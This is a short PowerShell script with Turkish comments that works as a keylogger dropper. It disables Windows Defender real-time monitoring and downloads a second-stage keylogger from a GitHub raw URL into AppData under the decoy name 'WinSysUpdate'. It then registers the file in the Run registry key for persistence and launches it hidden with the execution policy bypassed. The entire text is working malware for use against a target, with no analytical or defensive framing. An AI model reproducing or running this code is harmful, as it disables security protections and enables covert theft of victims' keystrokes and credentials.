# 1. Defender'i Kapat
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# 2. Asil Keylogger'in inecegi yol
$path = "$env:APPDATA\WinSysUpdate.ps1"

# 3. Stage-2'yi (Keylogger) GitHub'dan hedefin diskine indir
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Muzoovy4606/keylogger/refs/heads/main/keylogcu.ps1' -OutFile $path

# 4. Kalicilik (Persistence) Sagla - Bilgisayar acilisinda otomatik baslamasi icin Registry'ye ekle
New-ItemProperty -Path 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name 'WinSysUpdate' -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $path" -PropertyType String -Force

# 5. İnen Keylogger'i arka planda (gizli sekilde) hemen calistir
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $path"
